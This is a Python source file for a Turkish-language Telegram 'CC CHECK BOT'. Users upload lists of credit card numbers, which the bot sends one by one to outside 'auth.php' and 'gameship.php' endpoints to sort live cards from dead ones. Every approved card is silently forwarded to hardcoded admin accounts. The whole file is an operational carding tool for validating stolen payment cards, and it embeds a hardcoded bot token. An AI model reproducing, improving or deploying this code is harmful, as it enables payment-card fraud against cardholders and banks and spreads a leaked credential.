import asyncio
import aiohttp
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
import json
import os
from datetime import datetime
import re
from typing import Dict, List, Optional
from urllib.parse import quote, urljoin
import time

# ========== KONFİGÜRASYON ==========
TOKEN = os.environ.get("TOKEN", "8516981652:AAGl7kQFtSNfjRDoNbMbu4B6mBu0tGct5hk")
ADMINS = [7202281434, 6322020905]
CHANNEL_USERNAME = "@redbullbanksh"
API_BASE_URL = "https://isbankasi.gt.tc"
API_URL = f"{API_BASE_URL}/Api/Rewix/auth.php"
GAMESHIP_URL = f"{API_BASE_URL}/Api/Rewix/gameship.php"
# ===================================

# Global değişkenler
users_data = {}
user_stats: Dict[int, Dict] = {}
active_checks: Dict[int, Dict] = {}
active_gameship_checks: Dict[int, Dict] = {}

# Loglama ayarı
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class CheckSession:
    """Check oturumu yönetimi"""
    
    def __init__(self, user_id: int, check_type: str = "normal"):
        self.user_id = user_id
        self.check_type = check_type  # "normal" veya "gameship"
        self.is_active = False
        self.file_path = None
        self.start_time = None
        self.total_cards = 0
        self.processed_cards = 0
        self.approved = []
        self.declined = []
        self.live = []
        self.dead = []
        self.errors = []
        self.progress_message_id = None
        self.chat_id = None
        self.task = None
        
    def start(self, file_path: str, total_cards: int):
        self.is_active = True
        self.file_path = file_path
        self.start_time = datetime.now()
        self.total_cards = total_cards
        self.processed_cards = 0
        self.approved.clear()
        self.declined.clear()
        self.live.clear()
        self.dead.clear()
        self.errors.clear()
        
    def stop(self):
        self.is_active = False
        if self.file_path and os.path.exists(self.file_path):
            try:
                os.remove(self.file_path)
            except:
                pass
        
    def add_result(self, cc: str, result: str, status: str):
        if self.check_type == "normal":
            if status == "approved":
                self.approved.append(f"{cc} | {result}")
            elif status == "declined":
                self.declined.append(f"{cc} | {result}")
            else:
                self.errors.append(f"{cc} | {result}")
        else:  # gameship
            if status == "live":
                self.live.append(f"{cc} | {result}")
            elif status == "dead":
                self.dead.append(f"{cc} | {result}")
            else:
                self.errors.append(f"{cc} | {result}")
        
        self.processed_cards += 1
        
    def get_stats(self) -> Dict:
        if self.check_type == "normal":
            return {
                "total": self.total_cards,
                "processed": self.processed_cards,
                "approved": len(self.approved),
                "declined": len(self.declined),
                "errors": len(self.errors),
                "percentage": (self.processed_cards / self.total_cards * 100) if self.total_cards > 0 else 0
            }
        else:
            return {
                "total": self.total_cards,
                "processed": self.processed_cards,
                "live": len(self.live),
                "dead": len(self.dead),
                "errors": len(self.errors),
                "percentage": (self.processed_cards / self.total_cards * 100) if self.total_cards > 0 else 0
            }

def is_admin(user_id: int) -> bool:
    return user_id in ADMINS

async def is_channel_member(user_id: int, context: CallbackContext) -> bool:
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Kanal kontrol hatası: {e}")
        return False

async def handle_js_bypass(cc_number: str) -> Dict:
    """JavaScript bypass ile CC kontrolü"""
    try:
        cc_encoded = quote(cc_number)
        url = f"{API_URL}?kart={cc_encoded}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        timeout = aiohttp.ClientTimeout(total=15)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, headers=headers) as response:
                html = await response.text()
                
                # Basit analiz
                html_lower = html.lower()
                status = "declined"
                
                # Approved belirteçleri
                approved_keywords = ["approved", "live", "auth", "success", "valid"]
                for keyword in approved_keywords:
                    if keyword in html_lower:
                        status = "approved"
                        break
                
                # HTML temizleme
                clean_text = re.sub(r'<[^>]+>', '', html)
                clean_text = re.sub(r'\s+', ' ', clean_text).strip()
                
                return {
                    "status": "success",
                    "data": clean_text[:300],
                    "cc": cc_number,
                    "result_status": status
                }
                
    except Exception as e:
        return {
            "status": "error",
            "message": f"API hatası: {str(e)}",
            "cc": cc_number,
            "result_status": "error"
        }

async def check_gameship_api(cc_number: str) -> Dict:
    """Gameship API kontrolü"""
    try:
        cc_encoded = quote(cc_number)
        url = f"{GAMESHIP_URL}?card={cc_encoded}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json,text/html,*/*',
        }
        
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, headers=headers) as response:
                text = await response.text()
                
                # JSON veya plain text analizi
                response_lower = text.lower()
                status = "dead"
                
                # Live belirteçleri
                live_keywords = ["live", "active", "success", "valid", "working", "chargable"]
                for keyword in live_keywords:
                    if keyword in response_lower:
                        status = "live"
                        break
                
                return {
                    "status": "success",
                    "data": text[:500],
                    "cc": cc_number,
                    "result_status": status
                }
                
    except Exception as e:
        return {
            "status": "error", 
            "message": f"Gameship hatası: {str(e)}",
            "cc": cc_number,
            "result_status": "error"
        }

async def start(update: Update, context: CallbackContext):
    """Başlangıç komutu"""
    user = update.effective_user
    
    # Admin kontrolü
    admin_status = "👑 ADMIN" if is_admin(user.id) else "👤 KULLANICI"
    
    welcome_text = f"""
🆕 {admin_status} - {user.first_name}!

🤖 CC CHECK BOT v2.0

🎯 ÖZELLİKLER:
• 🔄 Normal CC Check (/st)
• 🎮 Gameship Check (/gms)
• ⚡ Anlık bildirimler
• 📊 Detaylı istatistikler
• 🛡️ JavaScript bypass

🔧 KOMUTLAR:
/st - Normal kontrol başlat
/gms - Gameship kontrolü başlat
/stats - İstatistikleriniz
/help - Yardım menüsü

📝 KULLANIM:
1. 📁 .txt dosyası gönder
2. 🔄 /st veya /gms komutunu kullan
3. ⏳ Bekle ve sonuçları al

⚠️ NOT: Her işlem ayrı oturumda çalışır!
"""
    
    await update.message.reply_text(welcome_text)

async def handle_document(update: Update, context: CallbackContext):
    """Dosya yükleme işlemi"""
    user = update.effective_user
    user_id = user.id
    
    # Kanal kontrolü
    if not await is_channel_member(user_id, context):
        await update.message.reply_text("❌ Lütfen önce kanala katılın: @redbullbanksh")
        return
    
    # Aktif kontrol kontrolü
    if user_id in active_checks or user_id in active_gameship_checks:
        await update.message.reply_text("⏳ Zaten aktif bir kontrolünüz var! Lütfen bitmesini bekleyin.")
        return
    
    document = update.message.document
    
    if not (document.mime_type == "text/plain" and document.file_name.endswith('.txt')):
        await update.message.reply_text("❌ Lütfen sadece .txt dosyası yükleyin!")
        return
    
    # Dosyayı indir
    file = await context.bot.get_file(document.file_id)
    timestamp = int(time.time())
    file_path = f"temp/{user_id}_{timestamp}.txt"
    os.makedirs("temp", exist_ok=True)
    
    await file.download_to_drive(file_path)
    
    # Dosyayı kontrol et
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
            cc_count = len(lines)
            
            if cc_count == 0:
                await update.message.reply_text("❌ Dosya boş!")
                os.remove(file_path)
                return
                
    except Exception as e:
        await update.message.reply_text(f"❌ Dosya okuma hatası: {e}")
        return
    
    # Dosya bilgisini kaydet
    users_data[user_id] = {
        'file_path': file_path,
        'cc_count': cc_count,
        'timestamp': timestamp,
        'username': user.username or user.first_name
    }
    
    # Butonlu mesaj
    keyboard = [
        [
            InlineKeyboardButton("🔄 Normal Check", callback_data=f"normal_{user_id}"),
            InlineKeyboardButton("🎮 Gameship", callback_data=f"gameship_{user_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ Dosya başarıyla yüklendi!\n"
        f"📊 Toplam CC: {cc_count}\n\n"
        f"Hangi kontrolü başlatmak istersiniz?",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: CallbackContext):
    """Buton tıklama işleyici"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = int(data.split('_')[1])
    check_type = data.split('_')[0]
    
    user = query.from_user
    
    if user.id != user_id:
        await query.edit_message_text("❌ Bu işlemi sadece dosya sahibi başlatabilir!")
        return
    
    if user_id not in users_data:
        await query.edit_message_text("❌ Dosya bulunamadı! Lütfen yeniden yükleyin.")
        return
    
    file_info = users_data[user_id]
    file_path = file_info['file_path']
    cc_count = file_info['cc_count']
    
    # Oturum oluştur
    if check_type == "normal":
        session = CheckSession(user_id, "normal")
        active_checks[user_id] = session
        command_text = "🔄 Normal Check"
    else:
        session = CheckSession(user_id, "gameship")
        active_gameship_checks[user_id] = session
        command_text = "🎮 Gameship Check"
    
    session.start(file_path, cc_count)
    session.chat_id = query.message.chat_id
    
    await query.edit_message_text(f"{command_text} başlatılıyor... {cc_count} CC kontrol edilecek.")
    
    # Progress mesajı
    progress_msg = await context.bot.send_message(
        chat_id=query.message.chat_id,
        text=f"⏳ İlerleme: 0/{cc_count} (0%)\n"
             f"✅ Başarılı: 0\n"
             f"❌ Başarısız: 0\n"
             f"⚠️ Hatalar: 0"
    )
    
    session.progress_message_id = progress_msg.message_id
    
    # Kontrolü başlat (async task olarak)
    if check_type == "normal":
        context.application.create_task(
            run_normal_check(user_id, session, context, query.message.chat_id)
        )
    else:
        context.application.create_task(
            run_gameship_check(user_id, session, context, query.message.chat_id)
        )

async def run_normal_check(user_id: int, session: CheckSession, context: CallbackContext, chat_id: int):
    """Normal check işlemini çalıştır"""
    try:
        with open(session.file_path, 'r', encoding='utf-8') as f:
            cc_list = [line.strip() for line in f if line.strip()]
        
        total = len(cc_list)
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        for idx, cc in enumerate(cc_list, 1):
            if not session.is_active:
                break
            
            # Rate limiting - Railway için
            await asyncio.sleep(0.3)
            
            result = await handle_js_bypass(cc)
            
            if result['status'] == 'success':
                status = result['result_status']
                session.add_result(cc, result['data'], status)
                
                if status == "approved":
                    approved_count += 1
                    # Kullanıcıya bildir
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=f"✅ APPROVED\n💳 {cc}\n📊 {result['data'][:200]}"
                        )
                    except:
                        pass
                    
                    # Adminlere bildir (kendisi hariç)
                    for admin_id in ADMINS:
                        if admin_id != user_id:
                            try:
                                await context.bot.send_message(
                                    chat_id=admin_id,
                                    text=f"🎯 APPROVED KART!\n👤 @{users_data.get(user_id, {}).get('username', 'Unknown')}\n💳 {cc}\n🆔 {user_id}"
                                )
                            except:
                                pass
                else:
                    declined_count += 1
            
            else:
                error_count += 1
                session.add_result(cc, result.get('message', 'Error'), 'error')
            
            # Progress güncelle (her 5 kartta bir)
            if idx % 5 == 0 or idx == total:
                stats = session.get_stats()
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=session.progress_message_id,
                        text=f"⏳ İlerleme: {stats['processed']}/{total} ({stats['percentage']:.1f}%)\n"
                             f"✅ Approved: {stats['approved']}\n"
                             f"❌ Declined: {stats['declined']}\n"
                             f"⚠️ Hatalar: {stats['errors']}"
                    )
                except:
                    pass
        
        # İşlem tamamlandı
        await finish_check_session(user_id, session, context, chat_id, "normal")
        
    except Exception as e:
        logger.error(f"Check error: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ Check hatası: {str(e)}"
        )
    finally:
        if user_id in active_checks:
            del active_checks[user_id]

async def run_gameship_check(user_id: int, session: CheckSession, context: CallbackContext, chat_id: int):
    """Gameship check işlemini çalıştır"""
    try:
        with open(session.file_path, 'r', encoding='utf-8') as f:
            cc_list = [line.strip() for line in f if line.strip()]
        
        total = len(cc_list)
        live_count = 0
        dead_count = 0
        error_count = 0
        
        for idx, cc in enumerate(cc_list, 1):
            if not session.is_active:
                break
            
            # Rate limiting
            await asyncio.sleep(0.5)
            
            result = await check_gameship_api(cc)
            
            if result['status'] == 'success':
                status = result['result_status']
                session.add_result(cc, result['data'], status)
                
                if status == "live":
                    live_count += 1
                    # Kullanıcıya bildir
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=f"🎮 LIVE\n💳 {cc}\n📊 {result['data'][:200]}"
                        )
                    except:
                        pass
                    
                    # Adminlere bildir
                    for admin_id in ADMINS:
                        if admin_id != user_id:
                            try:
                                await context.bot.send_message(
                                    chat_id=admin_id,
                                    text=f"🎮 GAMESHIP LIVE!\n👤 @{users_data.get(user_id, {}).get('username', 'Unknown')}\n💳 {cc}\n🆔 {user_id}"
                                )
                            except:
                                pass
                else:
                    dead_count += 1
            
            else:
                error_count += 1
                session.add_result(cc, result.get('message', 'Error'), 'error')
            
            # Progress güncelle
            if idx % 3 == 0 or idx == total:
                stats = session.get_stats()
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=session.progress_message_id,
                        text=f"⏳ İlerleme: {stats['processed']}/{total} ({stats['percentage']:.1f}%)\n"
                             f"✅ Live: {stats['live']}\n"
                             f"❌ Dead: {stats['dead']}\n"
                             f"⚠️ Hatalar: {stats['errors']}"
                    )
                except:
                    pass
        
        # İşlem tamamlandı
        await finish_check_session(user_id, session, context, chat_id, "gameship")
        
    except Exception as e:
        logger.error(f"Gameship error: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ Gameship hatası: {str(e)}"
        )
    finally:
        if user_id in active_gameship_checks:
            del active_gameship_checks[user_id]

async def finish_check_session(user_id: int, session: CheckSession, context: CallbackContext, chat_id: int, check_type: str):
    """Check oturumunu sonlandır"""
    stats = session.get_stats()
    
    # Sonuç dosyalarını oluştur
    timestamp = int(time.time())
    
    if check_type == "normal":
        if session.approved:
            approved_file = f"temp/approved_{user_id}_{timestamp}.txt"
            with open(approved_file, 'w', encoding='utf-8') as f:
                for item in session.approved:
                    f.write(f"{item}\n")
            
            # Kullanıcıya gönder
            try:
                with open(approved_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=f,
                        filename=f"approved_{timestamp}.txt",
                        caption=f"✅ Approved Kartlar ({len(session.approved)})"
                    )
            except Exception as e:
                logger.error(f"Approved file error: {e}")
            
            # Temizle
            os.remove(approved_file)
        
        if session.declined:
            declined_file = f"temp/declined_{user_id}_{timestamp}.txt"
            with open(declined_file, 'w', encoding='utf-8') as f:
                for item in session.declined:
                    f.write(f"{item}\n")
            
            try:
                with open(declined_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=f,
                        filename=f"declined_{timestamp}.txt",
                        caption=f"❌ Declined Kartlar ({len(session.declined)})"
                    )
            except Exception as e:
                logger.error(f"Declined file error: {e}")
            
            os.remove(declined_file)
        
        result_text = f"""
🎉 NORMAL CHECK TAMAMLANDI!

📊 SONUÇLAR:
• Toplam CC: {stats['total']}
• ✅ Approved: {stats['approved']}
• ❌ Declined: {stats['declined']}
• ⚠️ Hatalar: {stats['errors']}
• 📈 Başarı Oranı: {(stats['approved']/stats['total']*100 if stats['total'] > 0 else 0):.1f}%
"""
    
    else:  # gameship
        if session.live:
            live_file = f"temp/live_{user_id}_{timestamp}.txt"
            with open(live_file, 'w', encoding='utf-8') as f:
                for item in session.live:
                    f.write(f"{item}\n")
            
            # Kullanıcıya gönder
            try:
                with open(live_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=f,
                        filename=f"live_{timestamp}.txt",
                        caption=f"🎮 Live Kartlar ({len(session.live)})"
                    )
            except Exception as e:
                logger.error(f"Live file error: {e}")
            
            # Temizle
            os.remove(live_file)
        
        result_text = f"""
🎮 GAMESHIP CHECK TAMAMLANDI!

📊 SONUÇLAR:
• Toplam CC: {stats['total']}
• ✅ Live: {stats['live']}
• ❌ Dead: {stats['dead']}
• ⚠️ Hatalar: {stats['errors']}
• 📈 Live Oranı: {(stats['live']/stats['total']*100 if stats['total'] > 0 else 0):.1f}%
"""
    
    # Sonuç mesajı gönder
    await context.bot.send_message(chat_id=chat_id, text=result_text)
    
    # Admin raporu (kendisi hariç)
    admin_report = f"""
📊 {check_type.upper()} RAPORU
👤 Kullanıcı: @{users_data.get(user_id, {}).get('username', 'Unknown')}
🆔 ID: {user_id}
🔢 Toplam: {stats['total']}
✅ Başarılı: {stats['approved'] if check_type == 'normal' else stats['live']}
❌ Başarısız: {stats['declined'] if check_type == 'normal' else stats['dead']}
⚠️ Hatalar: {stats['errors']}
"""
    
    for admin_id in ADMINS:
        if admin_id != user_id:
            try:
                await context.bot.send_message(chat_id=admin_id, text=admin_report)
            except:
                pass
    
    # Oturumu temizle
    session.stop()
    if user_id in users_data:
        del users_data[user_id]

async def stats_command(update: Update, context: CallbackContext):
    """İstatistikler komutu"""
    user = update.effective_user
    
    # Basit istatistikler
    total_users = len(users_data)
    active_normal = len(active_checks)
    active_gameship = len(active_gameship_checks)
    
    stats_text = f"""
📊 BOT İSTATİSTİKLERİ

👤 Kullanıcı Bilgisi:
• ID: {user.id}
• Ad: {user.first_name}
• Admin: {'✅' if is_admin(user.id) else '❌'}

🤖 Sistem Durumu:
• Aktif Normal Check: {active_normal}
• Aktif Gameship: {active_gameship}
• Bekleyen Dosya: {total_users}

🔧 Komutlar:
/st - Normal check başlat
/gms - Gameship check başlat
/help - Yardım
"""
    
    await update.message.reply_text(stats_text)

async def help_command(update: Update, context: CallbackContext):
    """Yardım komutu"""
    help_text = """
🆘 YARDIM MENÜSÜ

📝 TEMEL KULLANIM:
1. 📁 .txt dosyası gönderin
2. 🔄 Butona tıklayın (Normal veya Gameship)
3. ⏳ Sonuçları bekleyin

🔧 KOMUTLAR:
/start - Botu başlat
/stats - İstatistikler
/help - Bu mesaj

🎯 ÖZELLİKLER:
• 🌀 Normal CC Check (auth.php)
• 🎮 Gameship Check (gameship.php)
• ⚡ Anlık bildirimler
• 📊 Detaylı raporlar
• 👑 Admin paneli (adminler için)

⚠️ NOTLAR:
• Dosya formatı: her satırda bir CC
• Max dosya boyutu: 1MB
• Railway free tier limitleri geçerlidir
"""
    
    await update.message.reply_text(help_text)

async def cancel_command(update: Update, context: CallbackContext):
    """İptal komutu"""
    user = update.effective_user
    
    cancelled = False
    
    if user.id in active_checks:
        session = active_checks[user.id]
        session.is_active = False
        del active_checks[user.id]
        cancelled = True
    
    if user.id in active_gameship_checks:
        session = active_gameship_checks[user.id]
        session.is_active = False
        del active_gameship_checks[user.id]
        cancelled = True
    
    if cancelled:
        await update.message.reply_text("✅ Aktif kontrol işleminiz iptal edildi!")
    else:
        await update.message.reply_text("❌ Aktif kontrol işleminiz bulunamadı!")

def main():
    """Ana fonksiyon"""
    # Application oluştur
    application = Application.builder().token(TOKEN).build()
    
    # Handler'ları ekle
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Admin komutları
    application.add_handler(CommandHandler("admin", start))
    
    print("🚀 Bot başlatılıyor...")
    print(f"👑 Admin sayısı: {len(ADMINS)}")
    print(f"📢 Kanal: {CHANNEL_USERNAME}")
    print("✅ V20+ Uyumlu")
    
    # Polling başlat
    application.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
        pool_timeout=30,
        connect_timeout=30,
        read_timeout=30,
        write_timeout=30
    )

if __name__ == '__main__':
    # Temp klasörünü oluştur
    os.makedirs("temp", exist_ok=True)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n⏹️ Bot durduruldu!")
    except Exception as e:
        logger.error(f"Bot hatası: {e}")
        print(f"❌ Kritik hata: {e}")